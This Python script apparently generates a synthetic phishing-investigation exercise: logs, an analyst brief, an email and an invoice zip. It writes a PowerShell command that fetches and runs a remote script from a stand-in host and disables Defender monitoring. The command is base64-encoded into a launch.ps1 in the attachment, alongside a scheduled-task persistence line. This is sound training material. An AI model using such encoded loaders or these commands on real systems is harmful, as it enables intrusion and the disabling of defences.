"""A synthetic investigation; all public infrastructure uses reserved examples."""
import base64
import json
import zipfile
from datetime import datetime, timedelta, timezone
from pathlib import Path


def generate(folder):
    folder = Path(folder)
    folder.mkdir(parents=True, exist_ok=True)
    base = datetime(2026, 10, 6, 8, 14, 0, tzinfo=timezone.utc)
    script = "Invoke-WebRequest https://cdn.northstar.example/update.ps1 | Invoke-Expression\nSet-MpPreference -DisableRealtimeMonitoring $true\n"
    encoded = base64.b64encode(script.encode("utf-16-le")).decode()
    (folder / "endpoint.jsonl").write_text("\n".join(json.dumps(e) for e in [
        {"timestamp": base.isoformat(), "event": "process", "host": "WS-FINANCE-07", "user": "maria@northstar.example", "command": "outlook.exe opened invoice.pdf"},
        {"timestamp": (base + timedelta(seconds=8)).isoformat(), "event": "process", "command": f"powershell.exe -EncodedCommand {encoded}", "pid": 4812},
        {"timestamp": (base + timedelta(seconds=19)).isoformat(), "event": "process", "command": "schtasks /create /tn UpdateSync /tr updater.exe /sc minute"},
        {"timestamp": (base + timedelta(minutes=4)).isoformat(), "event": "process", "command": "lsass.exe credential access attempt blocked by EDR"},
    ]) + "\n", encoding="utf-8")
    network = []
    # Ordinary adjacent activity provides comparison clusters without claiming it is malicious.
    for i, domain in enumerate(["identity.northstar.example", "updates.os.example", "status.northstar.example", "api.workspace.example", "metrics.northstar.example", "files.northstar.example", "support.northstar.example", "assets.northstar.example"]):
        network.append({"timestamp": (base - timedelta(minutes=4) + timedelta(seconds=i * 19)).isoformat(), "event": "dns",
                        "host": "WS-OPS-02", "src_ip": "10.20.8.20", "query": domain, "answer": f"203.0.113.{80 + i}", "context": "ordinary adjacent activity"})
    for i in range(36):
        timestamp = (base + timedelta(seconds=25 + i * 30)).isoformat()
        network.append({"timestamp": timestamp, "event": "dns", "src_ip": "10.20.8.17", "query": "cdn.northstar.example", "answer": "203.0.113.42", "bytes": 218 + i % 4})
        if i % 5 == 0:
            network.append({"timestamp": timestamp, "event": "http", "url": "https://telemetry.northstar.example/v1/collect", "dst_ip": "198.51.100.19", "status": 200})
    (folder / "network.jsonl").write_text("\n".join(json.dumps(e) for e in network) + "\n", encoding="utf-8")
    auth = []
    for i in range(12):
        auth.append(f"{(base + timedelta(minutes=2, seconds=i * 7)).isoformat()} authentication failed user=svc-backup src=10.20.8.17 host=DC-01")
    auth.append(f"{(base + timedelta(minutes=5)).isoformat()} login success user=svc-backup src=10.20.8.17 host=DC-01")
    (folder / "authentication.log").write_text("\n".join(auth) + "\n", encoding="utf-8")
    (folder / "analyst-brief.md").write_text("""# NORTHSTAR / CASE 017
Synthetic investigation — nothing here is a live threat.

Finance reported a suspicious invoice at 08:14 UTC.
Host: WS-FINANCE-07 / 10.20.8.17
Sender: billing@northstar.example
Delivery: hxxps://cdn[.]northstar[.]example/update.ps1
Infrastructure: 203.0.113.42; telemetry.northstar.example; 198.51.100.19
Referenced vulnerability: CVE-2024-3094 (context only; exploitation not established).

Questions:
1. Which files corroborate the same infrastructure?
2. Is network traffic periodic?
3. What did the encoded PowerShell command contain?
4. Did authentication failures precede the successful login?
5. Can the originals and investigation history be verified?

All .example names and TEST-NET IPs are reserved documentation values.
""", encoding="utf-8")
    with zipfile.ZipFile(folder / "mail-attachment.zip", "w", zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("invoice/readme.txt", "Invoice service: https://cdn.northstar.example/update.ps1\nContact billing@northstar.example\n")
        archive.writestr("invoice/launch.ps1", f"powershell -EncodedCommand {encoded}\n")
    (folder / "proxy.csv").write_text("timestamp,source,url,status,bytes\n" + "\n".join(
        f"{(base + timedelta(seconds=30 + i * 60)).isoformat()},10.20.8.17,https://cdn.northstar.example/update.ps1,200,{4800 + i * 8}"
        for i in range(8)) + "\n", encoding="utf-8")
    (folder / "message.eml").write_text("From: billing@northstar.example\nTo: maria@northstar.example\nSubject: Invoice 017\nDate: Tue, 6 Oct 2026 08:13:00 +0000\n\nDownload your invoice: https://cdn.northstar.example/update.ps1\n", encoding="utf-8")
    return folder
